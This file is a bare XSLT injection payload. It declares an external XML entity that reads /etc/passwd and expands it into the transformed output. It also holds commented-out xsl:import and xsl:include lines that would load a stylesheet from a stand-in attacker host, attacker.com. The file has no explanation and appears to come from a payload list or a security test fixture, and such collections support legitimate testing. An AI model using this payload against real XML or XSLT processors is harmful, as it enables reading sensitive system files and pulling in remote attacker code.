<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY content SYSTEM "file:/etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <!-- <xsl:import href="http://www.attacker.com/evil.xsl"/>
  <xsl:include href="http://www.attacker.com/evil.xsl"/> -->
 <xsl:template match="/">
  &content;
 </xsl:template>
</xsl:stylesheet>